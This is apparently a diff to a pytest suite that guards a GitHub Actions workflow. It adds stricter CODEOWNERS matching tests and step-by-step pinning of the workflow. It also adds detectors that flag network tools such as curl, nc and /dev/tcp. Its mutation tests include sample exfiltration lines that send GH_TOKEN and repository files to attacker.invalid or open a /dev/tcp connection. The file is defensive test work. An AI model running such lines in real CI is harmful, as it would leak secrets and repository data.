@@ -42,35 +42,65 @@ README = TEMPLATE / "README.md"
 # --- 1. CODEOWNERS ----------------------------------------------------------
 
 
+UNSUPPORTED = re.compile(r"[\[\]!?\\]")
+
+
 def parse_codeowners(text: str) -> list[tuple[str, list[str]]]:
-    """Rules in file order. A pattern with no owner un-owns its paths."""
+    """Rules in file order. A pattern with no owner un-owns its paths.
+
+    GitHub skips a line with unsupported syntax (``!``, ``[ ]``, a backslash
+    escape), so this boundary test refuses the file instead: a skipped line
+    would silently leave a path unowned. ``?`` is refused too, because GitHub's
+    page does not define it (read 2026-11-27).
+    """
     rules: list[tuple[str, list[str]]] = []
     for line in text.splitlines():
-        line = line.split(" #")[0].strip()
-        if not line or line.startswith("#"):
+        stripped = line.strip()
+        if not stripped or stripped.startswith("#"):
             continue
-        pattern, *owners = line.split()
+        tokens: list[str] = []
+        for token in stripped.split():
+            if token.startswith("#"):
+                break  # a trailing comment
+            tokens.append(token)
+        pattern, *owners = tokens
+        if UNSUPPORTED.search(pattern) or "***" in pattern:
+            raise ValueError(f"unsupported CODEOWNERS syntax: {pattern}")
+        for part in pattern.split("/"):
+            if "**" in part and part != "**":
+                raise ValueError(f"unsupported CODEOWNERS syntax: {pattern}")
         rules.append((pattern, owners))
     return rules
 
 
 def pattern_regex(pattern: str) -> re.Pattern[str]:
+    """Segment-aware matching, after GitHub's CODEOWNERS page (read 2026-11-27).
+
+    The page says the file "uses a pattern that follows most of the same rules
+    used in gitignore files", that "the last matching pattern takes the most
+    precedence", that ``docs/*`` matches ``docs/getting-started.md`` "but not
+    further nested files", and that ``/docs/`` owns the directory "and any of
+    its subdirectories". So: ``*`` never crosses ``/``; ``**`` as a whole
+    segment does (``**/x``, ``a/**/b``, ``a/**``); a leading ``/`` or a ``/``
+    inside the pattern anchors it to the root; a trailing ``/`` matches
+    everything under that directory; a pattern that ends in a name matches that
+    path only (the strict reading: it never claims a nested file by itself).
+    """
     directory = pattern.endswith("/")
     core = pattern.strip("/")
     anchored = pattern.startswith("/") or "/" in core
+    segments = core.split("/")
     out = ""
-    i = 0
-    while i < len(core):
-        if core.startswith("**", i):
-            out += ".*"
-            i += 2
+    for index, segment in enumerate(segments):
+        last = index == len(segments) - 1
+        if segment == "**":
+            out += ".*" if last else "(?:[^/]+/)*"
             continue
-        char = core[i]
-        out += "[^/]*" if char == "*" else "[^/]" if char == "?" else re.escape(char)
-        i += 1
+        out += "".join("[^/]*" if c == "*" else re.escape(c) for c in segment)
+        if not last:
+            out += "/"
     head = "^" if anchored else "(?:^|.*/)"
-    tail = "/.*$" if directory else "(?:/.*)?$"
-    return re.compile(head + out + tail)
+    return re.compile(head + out + ("/.+$" if directory else "$"))
 
 
 def owners_of(path: str, rules: list[tuple[str, list[str]]]) -> list[str]:
@@ -155,15 +185,71 @@ def test_the_example_names_a_single_placeholder_owner() -> None:
     assert {tuple(owners) for _, owners in rules} == {("@OWNER-LOGIN",)}
 
 
-def test_the_matcher_follows_the_last_match_wins_rule() -> None:
-    # Revert proof of the matcher itself: it is not a "first match" or a
-    # "any match" helper, and a later empty rule removes ownership.
-    rules = parse_codeowners("/scripts/ @a\n/scripts/x.sh @b\n/scripts/y.sh\n")
-    assert owners_of("scripts/x.sh", rules) == ["@b"]
-    assert owners_of("scripts/z.sh", rules) == ["@a"]
-    assert owners_of("scripts/y.sh", rules) == []
-    assert owners_of("other/scripts/z.sh", rules) == []
-    assert owners_of("scripts", rules) == []  # a trailing slash is a folder
+# Conformance fixtures: (patterns file, path, owned). Each row follows the
+# GitHub page read 2026-11-27 (see pattern_regex); the first is the review's case.
+MATCH_FIXTURES = [
+    ("/scripts/* @o", "scripts/a.sh", True),
+    ("/scripts/* @o", "scripts/vendor/evil.py", False),
+    ("/scripts/** @o", "scripts/vendor/evil.py", True),
+    ("/scripts/** @o", "scripts/a.sh", True),
+    ("scripts/* @o", "scripts/a.sh", True),
+    ("scripts/* @o", "scripts/vendor/evil.py", False),
+    ("scripts/* @o", "x/scripts/a.sh", False),  # a slash inside anchors it
+    ("/scripts/ @o", "scripts/vendor/evil.py", True),
+    ("/scripts/ @o", "scripts/a.sh", True),
+    ("/scripts/ @o", "scripts", False),
+    ("/scripts/ @o", "other/scripts/a.sh", False),
+    ("scripts/ @o", "other/scripts/a.sh", False),
+    ("/scripts @o", "scripts", True),
+    ("/scripts @o", "scripts/a.sh", False),  # strict: a name claims only itself
+    ("**/name.py @o", "name.py", True),
+    ("**/name.py @o", "a/b/name.py", True),
+    ("**/name.py @o", "a/b/other.py", False),
+    ("a/**/b @o", "a/b", True),
+    ("a/**/b @o", "a/x/y/b", True),
+    ("a/**/b @o", "a/x/c", False),
+    ("*.md @o", "README.md", True),
+    ("*.md @o", "docs/deep/README.md", True),
+    ("*.md @o", "README.md.bak", False),
+    ("/engine.lock @o", "engine.lock", True),
+    ("/engine.lock @o", "sub/engine.lock", False),
+    ("/engine.lock @o", "engine.lock.bak", False),
+    ("/a/ @o\n/a/b/", "a/b/c", False),  # an empty-owner override un-owns
+    ("/a/ @o\n/a/b/", "a/c", True),
+    ("/a/b/\n/a/ @o", "a/b/c", True),  # the last match wins
+    ("/a/ @o # note", "a/c", True),
+    ("# /a/ @o", "a/c", False),
+]
+
+
+@pytest.mark.parametrize(("text", "path", "expected"), MATCH_FIXTURES)
+def test_the_matcher_conforms_to_the_documented_cases(
+    text: str, path: str, expected: bool
+) -> None:
+    assert owned(path, parse_codeowners(text)) is expected
+
+
+@pytest.mark.parametrize(
+    "line",
+    ["!/a/ @o", "/a/[bc] @o", "\\#a @o", "/a/?.sh @o", "/a/b***c @o", "/a/b**c @o"],
+)
+def test_unsupported_syntax_is_refused_not_skipped(line: str) -> None:
+    # GitHub skips such a line, which would leave a path unowned without a sound.
+    with pytest.raises(ValueError, match="unsupported"):
+        parse_codeowners(line)
+
+
+def test_the_shipped_example_uses_only_supported_syntax() -> None:
+    assert example_rules()  # parse_codeowners raised on nothing
+
+
+def test_a_wildcard_rule_would_not_cover_a_nested_guard_file() -> None:
+    # The review's mutation: /scripts/* in place of /scripts/ leaves nested code.
+    text = CODEOWNERS.read_text(encoding="utf-8").replace("/scripts/ ", "/scripts/* ")
+    assert "/scripts/* " in text
+    rules = parse_codeowners(text)
+    assert owned("scripts/history-guard.py", rules)
+    assert not owned("scripts/vendor/evil.py", rules)
 
 
 @pytest.mark.parametrize("lost", PROTECTED)
@@ -315,20 +401,6 @@ def test_the_inventory_says_no_secrets_vars_inputs_or_artifacts() -> None:
         assert "actions/cache" not in text_
 
 
-def test_the_only_network_address_in_the_script_is_the_github_api() -> None:
-    tree = ast.parse(GUARD_PY.read_text(encoding="utf-8"))
-    urls = {
-        n.value
-        for n in ast.walk(tree)
-        if isinstance(n, ast.Constant)
-        and isinstance(n.value, str)
-        and "://" in n.value
-        and " " not in n.value
-    }
-    assert urls == {load_guard().API}
-    assert load_guard().API == "https://api.github.com"
-
-
 def test_the_inventory_checks_bite_on_an_unlisted_input(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
@@ -385,8 +457,10 @@ WRITE_SCOPES = {"write", "write-all"}
 
 
 def all_steps() -> list[dict[str, Any]]:
-    steps: list[dict[str, Any]] = workflow()["jobs"]["history-guard"]["steps"]
-    return steps
+    """The steps of EVERY job, not only the expected one."""
+    return [
+        step for job in workflow()["jobs"].values() for step in job.get("steps", [])
+    ]
 
 
 def test_no_permission_anywhere_is_a_write_and_no_job_is_a_reusable_call() -> None:
@@ -451,6 +525,55 @@ def stage_trusted_tree(root: Path, with_release: bool) -> Path:
     return base
 
 
+def run_like_actions(
+    text: str, cwd: Path, env: dict[str, str]
+) -> subprocess.CompletedProcess[bytes]:
+    """The shell form GitHub Actions uses for `shell: bash` (the default on
+    Linux): the run text in a file, run as bash --noprofile --norc -e -o
+    pipefail FILE. A step must fail closed under exactly these flags."""
+    script = cwd / "step.sh"
+    script.write_text(text, encoding="utf-8")
+    return subprocess.run(  # noqa: S603 - fixed argv, step text from the repo
+        ["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", str(script)],  # noqa: S607
+        cwd=cwd,
+        env=env,
+        capture_output=True,
+        check=False,
+    )
+
+
+JQ_STUB = """#!{python}
+# A pure-python stand-in for the few jq calls read-lock.sh makes, so the
+# release-mismatch test always runs, on a runner with or without jq.
+# Supported: jq -e/-r/-j FLAGS, then '.key' or '.key | strings', then a file.
+import json
+import sys
+
+args = sys.argv[1:]
+flags = "".join(a[1:] for a in args if a.startswith("-"))
+rest = [a for a in args if not a.startswith("-")]
+filt, path = rest[0], rest[1]
+key = filt.split("|")[0].strip().lstrip(".")
+only_strings = filt.split("|")[1:] == [" strings"]
+value = json.load(open(path)).get(key)
+if only_strings and not isinstance(value, str):
+    sys.exit(5)
+if "e" in flags and value in (None, False):
+    sys.exit(1)
+text = value if isinstance(value, str) else json.dumps(value)
+sys.stdout.write(text if "j" in flags else text + "\\n")
+"""
+
+
+def jq_stub_dir(root: Path) -> Path:
+    folder = root / "stub-bin"
+    folder.mkdir(exist_ok=True)
+    target = folder / "jq"
+    target.write_text(JQ_STUB.format(python=sys.executable), encoding="utf-8")
+    target.chmod(0o755)
+    return folder
+
+
 def run_trust_step(root: Path) -> subprocess.CompletedProcess[bytes]:
     step = next(s for s in all_steps() if s.get("id") == "trust")
     runner_temp = root / "runner-temp"
@@ -458,17 +581,11 @@ def run_trust_step(root: Path) -> subprocess.CompletedProcess[bytes]:
     output = root / "github-output"
     output.write_text("", encoding="utf-8")
     env = {
-        "PATH": os.environ["PATH"],
+        "PATH": f"{jq_stub_dir(root)}:{os.environ['PATH']}",
         "RUNNER_TEMP": str(runner_temp),
         "GITHUB_OUTPUT": str(output),
     }
-    return subprocess.run(  # noqa: S603 - fixed argv, step text from the repo
-        ["bash", "-c", step["run"]],  # noqa: S607
-        cwd=root,
-        env=env,
-        capture_output=True,
-        check=False,
-    )
+    return run_like_actions(step["run"], root, env)
 
 
 def installed_dir(root: Path) -> Path:
@@ -514,8 +631,6 @@ def test_the_trust_step_fails_when_a_trusted_file_is_missing(tmp_path: Path) -> 
 def test_the_trust_step_stops_a_bad_release_pair_before_any_output(
     tmp_path: Path,
 ) -> None:
-    if shutil.which("jq") is None:
-        pytest.skip("jq is not installed")
     base = stage_trusted_tree(tmp_path, with_release=True)
     ok = run_trust_step(tmp_path)
     assert ok.returncode == 0, ok.stderr
@@ -552,3 +667,415 @@ def test_the_sparse_base_checkout_holds_what_the_guard_needs_to_run(
         if (TEMPLATE / rel).is_file():
             assert (base / rel).is_file(), f"{rel} is not in the base checkout"
     assert (base / "engine.lock").is_file()
+
+
+# --- 4. the workflow is pinned step by step, and reaches only GitHub ---------
+#
+# Inventorying variable NAMES (section 2) does not stop a new step, a second job
+# or a rebuilt URL. These controls do: every job is checked, every step must
+# match one entry of STEP_TABLE, and nothing may call out except to the GitHub
+# API of this repository.
+#
+# TO CHANGE THE WORKFLOW ON PURPOSE: edit the workflow, run
+#     python tests/test_history_guard_boundary.py
+# which prints the new table rows, review each changed step by name in the pull
+# request, and paste the rows into STEP_TABLE below. A change that does not
+# update the table fails test_the_workflow_matches_the_pinned_step_table and
+# names the step, so a reviewer cannot miss it. The script's own destinations
+# are checked from its syntax tree (script_problems), not pinned by hash, so
+# ordinary script edits do not need a table change.
+
+import hashlib  # noqa: E402
+import json  # noqa: E402
+
+ALLOWED_JOBS = frozenset({"history-guard"})
+ALLOWED_HOSTS = frozenset({"api.github.com"})
+ALLOWED_IMPORTS = frozenset(
+    {
+        "__future__",
+        "argparse",
+        "json",
+        "os",
+        "re",
+        "subprocess",
+        "sys",
+        "tempfile",
+        "urllib.error",
+        "urllib.parse",
+        "urllib.request",
+        "datetime",
+        "pathlib",
+        "typing",
+    }
+)
+ALLOWED_FROM = frozenset({"__future__", "datetime", "pathlib", "typing"})
+FORBIDDEN_CALLS = frozenset(
+    {"eval", "exec", "compile", "__import__", "getattr", "setattr", "globals", "vars"}
+)
+SUBPROCESS_PROGRAMS = frozenset({"git", "bash"})
+
+NETWORK_WORD = re.compile(
+    r"(?<![\w./$-])(curl|wget|nc|ncat|netcat|socat|ssh|scp|sftp|telnet|ftp|gh|dig"
+    r"|nslookup|openssl|npm|npx|pip|pip3|uv|apt|apt-get|docker|podman)(?![\w-])"
+)
+NETWORK_TOKEN = re.compile(
+    r"urllib|requests|http\.client|httplib|socket|httpx|aiohttp|ftplib|smtplib"
+    r"|/dev/tcp|/dev/udp|\bpython3?\s+(?:-\w+\s+)*-c\b"
+    r"|\bgit\s+(?:-\S+\s+)*(?:fetch|pull|clone|push|ls-remote|remote|submodule)\b"
+)
+URL_HOST = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://([^/\s'\"]*)")
+
+
+def normalized_run(text: str) -> str:
+    return "\n".join(line.rstrip() for line in text.strip().splitlines())
+
+
+def step_digest(step: dict[str, Any]) -> str:
+    """SHA-256 of the whole step (name, uses, with, env, run) in canonical form."""
+    canon = dict(step)
+    if "run" in canon:
+        canon["run"] = normalized_run(canon["run"])
+    blob = json.dumps(canon, sort_keys=True, separators=(",", ":"))
+    return hashlib.sha256(blob.encode("utf-8")).hexdigest()
+
+
+# (step name, action pinned by commit or "run", digest of the whole step)
+STEP_TABLE: list[tuple[str, str, str]] = [
+    (
+        "Fetch the trusted files from the base commit",
+        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+        "432116a9fbffe13a3cc63a01a7398127a827ddacebab76c18ecd897c35ecf45e",
+    ),
+    (
+        "Fetch the running copy of this workflow",
+        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+        "d6912861be7727996addd2e03cb8eb4bd7de7ad10e876ed946b15e93cc3c8292",
+    ),
+    (
+        "Refuse when the running workflow differs from the base copy",
+        "run",
+        "aca1c35db897f3aa1b70fbcc9fadcf0a0cac08f154405094874989648b2dd33b",
+    ),
+    (
+        "Install the trusted copies and choose the engine image",
+        "run",
+        "2bd4f2164d53e6c1803e93982cd69572963e02a799b5d7c9d4770624e9c644ad",
+    ),
+    (
+        "Fetch the pull request head",
+        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+        "56157046f0082340be2d530b19fe213733f52aaa2011a343d0bdeaac05a1363c",
+    ),
+    (
+        "Guard the history file",
+        "run",
+        "842effc8be6f367c12ec84efc28e74fe221586d0ccc055d24d9b8696857cac82",
+    ),
+]
+
+
+def shell_problems(text: str, where: str) -> list[str]:
+    """Network-capable commands and foreign hosts in shell text. Comments are
+    ignored: only what runs is read."""
+    code = "\n".join(
+        line for line in text.splitlines() if not line.lstrip().startswith("#")
+    )
+    found = [f"{where}: network command {m}" for m in NETWORK_WORD.findall(code)]
+    found += [f"{where}: network use {m}" for m in NETWORK_TOKEN.findall(code)]
+    for host in URL_HOST.findall(code):
+        if host not in ALLOWED_HOSTS:
+            found.append(f"{where}: host {host or '(empty)'} is not allowed")
+    return found
+
+
+def workflow_problems(data: dict[Any, Any]) -> list[str]:
+    """Everything wrong with a workflow's jobs and steps; empty means as pinned."""
+    found: list[str] = []
+    jobs = data.get("jobs", {})
+    for name in jobs:
+        if name not in ALLOWED_JOBS:
+            found.append(f"job {name}: not an expected job")
+    for name in ALLOWED_JOBS - set(jobs):
+        found.append(f"job {name}: missing")
+    table = {entry[0]: entry for entry in STEP_TABLE}
+    for job_name, job in jobs.items():
+        if "uses" in job:
+            found.append(f"job {job_name}: calls a reusable workflow")
+        steps = job.get("steps", [])
+        for step in steps:
+            label = f"{job_name}/{step.get('name', step.get('uses', '?'))}"
+            if "uses" in step and not str(step["uses"]).startswith("actions/checkout@"):
+                found.append(f"{label}: action {step['uses']} is not allowed")
+            if "run" in step:
+                found += shell_problems(step["run"], label)
+            for value in strings(step.get("with", {})):
+                found += shell_problems(value, f"{label} (with)")
+            if job_name in ALLOWED_JOBS:
+                entry = table.get(step.get("name", ""))
+                if entry is None:
+                    found.append(f"step {label}: not in STEP_TABLE")
+                elif entry[2] != step_digest(step):
+                    found.append(
+                        f"step {label}: changed; new digest {step_digest(step)}"
+                    )
+        if job_name in ALLOWED_JOBS and [s.get("name") for s in steps] != [
+            e[0] for e in STEP_TABLE
+        ]:
+            found.append(f"job {job_name}: the list of steps changed")
+    return found
+
+
+def script_problems(source: str) -> list[str]:
+    """Network and execution surface of the guard script, from its syntax tree."""
+    tree = ast.parse(source)
+    found: list[str] = []
+    api_ok = False
+    url_forms = {
+        ast.dump(ast.parse(code, mode="eval").body)
+        for code in ('f"{API}{path}"', "match.group(1)")
+    }
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Import):
+            for alias in node.names:
+                if alias.name not in ALLOWED_IMPORTS:
+                    found.append(f"import {alias.name} is not allowed")
+        elif isinstance(node, ast.ImportFrom):
+            if node.module not in ALLOWED_FROM:
+                found.append(f"from {node.module} import is not allowed")
+        elif isinstance(node, ast.Call):
+            name = ast.unparse(node.func)
+            if name in FORBIDDEN_CALLS:
+                found.append(f"call {name} is not allowed")
+            if name.startswith("subprocess."):
+                first = node.args[0] if node.args else None
+                program = (
+                    first.elts[0]
+                    if isinstance(first, ast.List) and first.elts
+                    else None
+                )
+                if not (
+                    isinstance(program, ast.Constant)
+                    and program.value in SUBPROCESS_PROGRAMS
+                ):
+                    found.append("subprocess call with a program that is not fixed")
+                if any(k.arg == "shell" for k in node.keywords):
+                    found.append("subprocess call with shell")
+            if name == "urllib.request.urlopen" and not (
+                node.args
+                and isinstance(node.args[0], ast.Name)
+                and node.args[0].id == "request"
+            ):
+                found.append("urlopen is not called with the request built from url")
+            if name == "urllib.request.Request" and not (
+                node.args
+                and isinstance(node.args[0], ast.Name)
+                and node.args[0].id == "url"
+            ):
+                found.append("Request is not built from the url variable")
+            if name == "api_get":
+                arg = node.args[0] if node.args else None
+                lead = arg.values[0] if isinstance(arg, ast.JoinedStr) else arg
+                if not (
+                    isinstance(lead, ast.Constant)
+                    and isinstance(lead.value, str)
+                    and lead.value.startswith("/repos/")
+                ):
+                    found.append("api_get path does not start with /repos/")
+        elif isinstance(node, ast.Attribute):
+            base = ast.unparse(node.value)
+            if base == "os" and node.attr not in {"environ", "getenv"}:
+                found.append(f"os.{node.attr} is not allowed")
+            if base == "urllib.request" and node.attr not in {"Request", "urlopen"}:
+                found.append(f"urllib.request.{node.attr} is not allowed")
+        elif isinstance(node, ast.Assign):
+            targets = [ast.unparse(t) for t in node.targets]
+            if targets == ["url"] and ast.dump(node.value) not in url_forms:
+                found.append("url is assigned a value that is not API plus a path")
+            if targets == ["API"]:
+                value = node.value
+                api_ok = (
+                    isinstance(value, ast.Constant)
+                    and isinstance(value.value, str)
+                    and value.value.startswith("https://")
+                    and value.value[len("https://") :] in ALLOWED_HOSTS
+                )
+        elif isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
+            for side in (node.left, node.right):
+                if (
+                    isinstance(side, ast.Constant)
+                    and isinstance(side.value, str)
+                    and side.value.strip()
+                ):
+                    found.append("a string is built by + or %: use a constant")
+        elif (
+            isinstance(node, ast.Constant)
+            and isinstance(node.value, str)
+            and "://" in node.value
+            and not (isinstance(node.value, str) and node.value.startswith("https://"))
+        ):
+            found.append("a string holds a URL scheme that is not https")
+    if not api_ok:
+        found.append("API is not the one allowed GitHub API host")
+    urls = [
+        n.value
+        for n in ast.walk(tree)
+        if isinstance(n, ast.Constant) and isinstance(n.value, str) and "://" in n.value
+    ]
+    if urls != ["https://api.github.com"]:
+        found.append("URL constants are not exactly the GitHub API host")
+    return found
+
+
+SCRIPTS_RUN_BY_THE_JOB = ("read-lock.sh", "verify-history-rewrite.sh")
+
+
+def test_the_workflow_matches_the_pinned_step_table() -> None:
+    assert workflow_problems(workflow()) == []
+
+
+def test_the_script_reaches_only_the_github_api_and_runs_only_git_and_bash() -> None:
+    assert script_problems(GUARD_PY.read_text(encoding="utf-8")) == []
+
+
+@pytest.mark.parametrize("name", SCRIPTS_RUN_BY_THE_JOB)
+def test_the_shell_scripts_the_job_runs_reach_nothing(name: str) -> None:
+    text = (TEMPLATE / "scripts" / name).read_text(encoding="utf-8")
+    assert shell_problems(text, name) == []
+
+
+def mutated(edit: Any) -> dict[Any, Any]:
+    data = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
+    edit(data)
+    return data  # type: ignore[no-any-return]
+
+
+def guard_step(data: dict[Any, Any]) -> dict[str, Any]:
+    step: dict[str, Any] = data["jobs"]["history-guard"]["steps"][-1]
+    return step
+
+
+def test_a_curl_step_in_the_token_step_is_caught() -> None:
+    def edit(data: dict[Any, Any]) -> None:
+        guard_step(data)["run"] += (
+            '\ncurl -fsS -H "Authorization: Bearer $GH_TOKEN"'
+            " --data-binary @pr/history/social.jsonl https://attacker.invalid/x"
+        )
+
+    problems = workflow_problems(mutated(edit))
+    assert any("Guard the history file: changed" in p for p in problems)
+    assert any("network command curl" in p for p in problems)
+    assert any("attacker.invalid" in p for p in problems)
+
+
+def test_a_new_step_and_a_second_job_are_caught() -> None:
+    def add_step(data: dict[Any, Any]) -> None:
+        data["jobs"]["history-guard"]["steps"].append({"name": "Extra", "run": "ls"})
+
+    assert any("not in STEP_TABLE" in p for p in workflow_problems(mutated(add_step)))
+
+    def add_job(data: dict[Any, Any]) -> None:
+        data["jobs"]["exfil"] = {
+            "runs-on": "ubuntu-latest",
+            "steps": [{"run": "curl https://attacker.invalid"}],
+        }
+
+    problems = workflow_problems(mutated(add_job))
+    assert any("job exfil: not an expected job" in p for p in problems)
+    assert any("exfil/" in p and "curl" in p for p in problems)
+
+
+def test_a_changed_run_text_or_pin_is_caught_by_name() -> None:
+    def run_text(data: dict[Any, Any]) -> None:
+        for step in data["jobs"]["history-guard"]["steps"]:
+            if step.get("id") == "trust":
+                step["run"] = step["run"].replace("chmod -R a-w", "chmod -R a+w")
+
+    assert any(
+        "Install the trusted copies and choose the engine image: changed" in p
+        for p in workflow_problems(mutated(run_text))
+    )
+
+    def pin(data: dict[Any, Any]) -> None:
+        step = data["jobs"]["history-guard"]["steps"][0]
+        step["uses"] = step["uses"][:-1] + "0"
+
+    assert any("Fetch the trusted files" in p for p in workflow_problems(mutated(pin)))
+
+    def other_action(data: dict[Any, Any]) -> None:
+        data["jobs"]["history-guard"]["steps"][0]["uses"] = "evil/action@" + "a" * 40
+
+    assert any("is not allowed" in p for p in workflow_problems(mutated(other_action)))
+
+
+def test_a_url_in_an_action_input_and_other_network_forms_are_caught() -> None:
+    for text in (
+        "wget https://api.github.com/x",
+        "python3 -c 'print(1)'",
+        "git fetch origin",
+        "exec 3<>/dev/tcp/1.2.3.4/80",
+        "gh api /repos/x/y",
+        "echo http://api.github.com.evil.example/x",
+    ):
+        assert shell_problems(text, "t"), text
+    assert shell_problems("# curl https://evil.example\necho ok", "t") == []
+    assert shell_problems('python3 -I "$TRUSTED/scripts/history-guard.py"', "t") == []
+
+
+GUARD_SOURCE = GUARD_PY.read_text(encoding="utf-8")
+
+
+@pytest.mark.parametrize(
+    ("old", "new", "expect"),
+    [
+        (
+            "with urllib.request.urlopen(request, timeout=30) as reply:",
+            'with urllib.request.urlopen("https:" + "//attacker.invalid/?t="'
+            ' + os.environ["GH_TOKEN"], timeout=30) as reply:',
+            "urlopen is not called",
+        ),
+        (
+            '    url = f"{API}{path}"\n',
+            '    url = "https:" + "//attacker.invalid" + path\n',
+            "url is assigned",
+        ),
+        ("import tempfile\n", "import tempfile\nimport socket\n", "socket"),
+        ("import tempfile\n", "import tempfile\nimport requests\n", "requests"),
+        (
+            "import urllib.request\n",
+            "import urllib.request\nimport http.client\n",
+            "http.client",
+        ),
+        ('["git", "-C", str(pr), *args]', '["curl", str(pr), *args]', "not fixed"),
+        ('API = "https://api.github.com"', 'API = "https://attacker.invalid"', "API"),
+        ("def env(", "def env2(*a):\n    return eval(a[0])\n\n\ndef env(", "eval"),
+        (
+            "urllib.request.urlopen(request",
+            "urllib.request.build_opener(request",
+            "build_opener",
+        ),
+        (
+            'f"/repos/{repo}/git/ref/heads/main"',
+            'f"@attacker.invalid/{repo}/git/ref/heads/main"',
+            "api_get path",
+        ),
+    ],
+)
+def test_the_script_checks_bite_on_each_network_mutation(
+    old: str, new: str, expect: str
+) -> None:
+    assert old in GUARD_SOURCE, old
+    problems = script_problems(GUARD_SOURCE.replace(old, new, 1))
+    assert any(expect in p for p in problems), (expect, problems)
+
+
+def table_rows() -> str:
+    rows = []
+    for step in workflow()["jobs"]["history-guard"]["steps"]:
+        kind = step["uses"] if "uses" in step else "run"
+        rows.append(f"    ({step['name']!r}, {kind!r}, {step_digest(step)!r}),")
+    return "\n".join(rows)
+
+
+if __name__ == "__main__":
+    print("STEP_TABLE rows for the current workflow:")
+    print(table_rows())
